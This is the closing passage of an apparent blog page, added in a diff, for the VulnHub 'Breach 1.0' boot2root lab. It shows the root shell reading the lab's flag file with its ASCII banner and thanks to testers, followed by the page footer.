+drwxr-xr-x  2 root root  4096 Jun  5  2016 .rpmdb
+<span class="nt">-rw-r--r--</span>  1 root root    66 Jun  4  2016 .selected_editor
+root@Breach:~# <span class="nb">cat</span> .flag.txt 
+<span class="nt">-----------------------------------------------------------------------------------</span>
+
+______                     _     __   _____      _____ _          _____          _ 
+| ___ <span class="se">\ </span>                  | |   /  | |  _  |    |_   _| |        |  ___|        | |
+| |_/ /_ __ ___  __ _  ___| |__ <span class="sb">`</span>| | | |/<span class="s1">' |______| | | |__   ___| |__ _ __   __| |
+| ___ \ '</span>__/ _ <span class="se">\/</span> _<span class="sb">`</span> |/ __| <span class="s1">'_ \ | | |  /| |______| | | '</span>_ <span class="se">\ </span>/ _ <span class="se">\ </span> __| <span class="s1">'_ \ / _` |
+| |_/ / | |  __/ (_| | (__| | | || |_\ |_/ /      | | | | | |  __/ |__| | | | (_| |
+\____/|_|  \___|\__,_|\___|_| |_\___(_)___/       \_/ |_| |_|\___\____/_| |_|\__,_|
+
+
+-----------------------------------------------------------------------------------
+Congrats on reaching the end and thanks for trying out my first #vulnhub boot2root!
+
+Shout-out to knightmare, and rastamouse for testing and g0tmi1k for hosting.
+</span></code></pre></div></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <footer>
+<!--	  <div class="dashed"></div> -->
+    <ul class="horizontal-list">
+  
+</ul>
+
+  </footer>
+
+
+        
+          <button title="Toggle Theme" class="theme-toggle">
+  <svg viewBox="0 0 32 32" width="24" height="24" fill="currentcolor">
+    <circle cx="16" cy="16" r="14" fill="none" stroke="currentcolor" stroke-width="4"></circle>
+    <path d="
+             M 16 0
+             A 16 16 0 0 0 16 32
+             z">
+    </path>
+  </svg>
+</button>
+
+        
+        <div class="credits">&copy;&nbsp;2022&nbsp;s4rgaz
+          &nbsp;
+		  •
+          &nbsp;<!--Powered by <a href="https://www.soopr.co" target="_blank" rel="noreferrer">Soopr</a>
+          &nbsp;
+		  •
+          &nbsp;-->
+		  <!--Theme&nbsp; <a href="https://github.com/abhinavs/moonwalk" target="_blank" rel="noreferrer">Moonwalk</a>-->
+		  RSS&nbsp; <a href="/feed.xml" target="_blank" rel="noreferrer">Feed</a>
+        </div>
+      </div>
+    </main><script async defer src="https://sdk.soopr.co/soopr.js"></script></body>
+</html>
